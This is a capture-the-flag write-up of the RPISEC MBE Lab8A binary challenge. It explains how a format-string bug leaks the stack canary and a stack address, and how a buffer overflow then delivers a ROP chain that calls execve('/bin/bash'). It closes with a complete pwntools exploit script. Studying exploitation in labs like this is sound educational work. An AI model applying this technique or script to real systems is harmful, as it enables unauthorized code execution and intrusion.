---
layout: post
title:  "MBE Lab8A Writeup"
---

## Introduction
In this article I will summaries how I solved [MBE](https://github.com/RPISEC/MBE) Lab8A CTF Challenge.

## Writeup
The challenge starts with a standard ELF binary named lab8A.
Going through my usual ritual, I first check for memory mitigations:

* Stack canaries
* Stack non executable
* No Position Independent Executable
* ASLR

Identifying the file

```shell
root@warzone:/levels/lab08
# file lab8A
lab8A: ELF 32-bit LSB  executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=760ccd5bdb365cd6acbc1befc07e58fec83743a1, not stripped
```

And it seems the ELF is statically-linked and not stripped.<br/>
During my static analysis with IDA, I have found two very strong primitives.<br/>
A controlled format string within the `selectABook()` function:

And a buffer-overflow within the `findSomeWords()` function:

Now I am aware of the stack canaries mitigation which will prevent me from exploiting the buffer-overflow primitive to gain EIP control.<br/>
However though using the format-string primitive, I can read memory right off the stack, especially the stack canary! And because the stack canary is stored within the thread local data, it is the same for all of the functions running on the main thread. Therefore letting me use it later within the buffer-overflow primitive to bypass the canary check.

From the function’s prologue I can tell the stack frame size is 528:

```shell
;08048f0b selectABook:
    push   ebp ; -4
    mov    ebp,esp
    sub    esp,0x20c ; -524
    ; -528 in total.
```

The stack canary is placed right under the saved ebp, that means at `[ebp-4]`, or `[esp+524]`. Printf’s parameters start at `[esp+4]`, `[esp+8]`, …,<br/>
So that means that if `[esp+4]` is the first argument to printf, then `[esp+524]` will be the `$(524\div4)=130$` argument to printf.<br/>
I can use the direct parameter access format: `printf("%130$x");` to print the stack canary’s value in hex.

An additional check has been implemented within the findSomeWords function. Which I will be able to pass by setting 17th element of my buffer to 0xDEADBEEF.

I then went on searching for unsafe functions within the binary, like `system()` and all of the forms of the `exec()` functions. But came empty handed. It was time for a ROP chain. I can create a ROP chain to call the `execve` syscall. From [Linux Syscall Table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit) I can see the `execve` documentation:

In order to use the syscall to call `/bin/bash`, I can set `envp` and argv to `NULL`, in other words `edx` and `ecx` to 0, `ebx` must point to an address which contains the string `“/bin/bash”`, and `eax` needs to contain `0x0b`, before calling int `0x80` to trigger a syscall.<br/>
Luckily because the ELF is not position independent I can avoid an extra info leak from the ELF address space to construct my ROP chain. The only issue is, I don’t have any addresses within the ELF containing the `“/bin/bash”` string, so I must create one. I can use the stack frame of `selectABook` to store the string and later reference it within my ROP chain. However because it will be stored within the stack, and ASLR is turned on, I need an address leak from the stack. The format-string primitive not only enables me to leak the canary, but also leak a stack address, and store the `“/bin/bash”` string on the stack, using: `printf("%p%130$x/bin/bash");` such that:

* %p
  * will leak the address of the 1st argument which is stored on stack, therefore leaking a stack address, which I will use to calculate the address of “/bin/bash” stored later.
* %130$x
  * As we have seen will leak the canary
* /bin/bash
  * will be stored on the stack, which I will use later in my ROP chain.
  In order to construct my ROP chain I used [ROPgadget.py](https://github.com/JonathanSalwan/ROPgadget) and came up with the following chain:

```shell
pop edx, pop ecx, pop ebx, retn ;0x0806F250
pop eax, retn ;0x080E4809
int 0x80 ;0x0806CD55
```

It is important to note that due to the large buffer overflow, I can insert whatever I want into the stack, and thus using the pop instruction as some kind of “mov”. In summary, the state of the stack will look like:

Running the full exploit:

![POC](/assets/img/poc.png)

And I am done.

Adding the exploit code for reference:

```python
from pwn import remote, p32
from pwn import log as pwnlog

REMOTE_HOST = '192.168.0.111'
REMOTE_PORT = 8841

def main():
    with remote(REMOTE_HOST, REMOTE_PORT) as r:
        r.recvuntil(b"Last Name: ")
        r.sendline(b"%pG%130$x/bin/bash")

        # Leaking stack address (ebp-0x204)      
        leak = int(r.recvuntil(b"G")[:-1].strip().decode(), 16)
        binbash_address = leak + 9
        pwnlog.success("Leaked stack address: 0x%x" % leak)
        pwnlog.success("Calculated binbash address: 0x%x" % binbash_address)

        # Read canary
        canary = int(r.recvuntil(b"/")[:-1].strip().decode(), 16)
        pwnlog.success("Leaked canary: 0x%x" % canary)

        # Finish recusion
        r.sendline(b"A")
        r.recvuntil(b"^_^ <==  ")

        # Build ropchain
        pwnlog.info("Sending ROP chain")
        r.send((b"A" * 16) + p32(0xDEADBEEF) + (b"A" * 4) + p32(canary) + b"JUNK" + p32(0x0806F250) + p32(0x0) + p32(0x0) + p32(binbash_address) + p32(0x080E4809) + p32(0xB) + p32(0x0806CD55))      
        r.interactive()

if __name__ == "__main__":
    main()
```
